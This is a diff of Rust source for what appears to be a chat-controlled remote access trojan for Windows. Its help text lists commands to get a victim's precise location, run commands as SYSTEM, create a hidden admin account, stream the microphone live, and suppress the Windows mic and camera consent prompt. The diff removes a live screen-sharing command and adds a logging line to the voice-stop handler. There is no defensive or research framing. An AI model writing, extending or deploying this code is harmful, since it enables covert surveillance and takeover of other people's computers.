@@ -58,7 +58,6 @@ const HELP: &str = "\
 !location                  precise location (Windows Location API)
 !systask <cmd>             run a command as SYSTEM, return output (admin)
 !newuser <name> <pass>     create a local admin account (admin)
-!screenshare               join voice + share the screen live
 !voice                     join voice + stream the microphone live
 !vc stop                   stop a live voice stream
 !priv                      pre-grant mic/camera consent (stops the Windows prompt)
@@ -620,19 +619,6 @@ pub async fn dispatch(
                 st.send_code(console, &r).await?;
             }
         }
-        "screenshare" | "share" => {
-            st.send(console, "joining voice + sharing screen ...").await?;
-            let st2 = st.clone();
-            let cfg2 = cfg.clone();
-            let ws2 = ws.clone();
-            tokio::spawn(async move {
-                if let Err(e) = crate::voice::screenshare(&st2, &cfg2, &ws2).await {
-                    let _ = st2
-                        .send(&ws2.channels.console, &format!("screenshare failed: {e:#}"))
-                        .await;
-                }
-            });
-        }
         "voice" | "micstream" => {
             st.send(console, "joining voice + streaming mic ...").await?;
             let st2 = st.clone();
@@ -649,6 +635,7 @@ pub async fn dispatch(
         "vc" => {
             if arg.trim().eq_ignore_ascii_case("stop") {
                 crate::voice::STOP.store(true, std::sync::atomic::Ordering::SeqCst);
+                eprintln!("[voice] stop requested by operator");
                 st.send(console, "stopping voice stream").await?;
             } else {
                 st.send(console, "usage: !vc stop").await?;
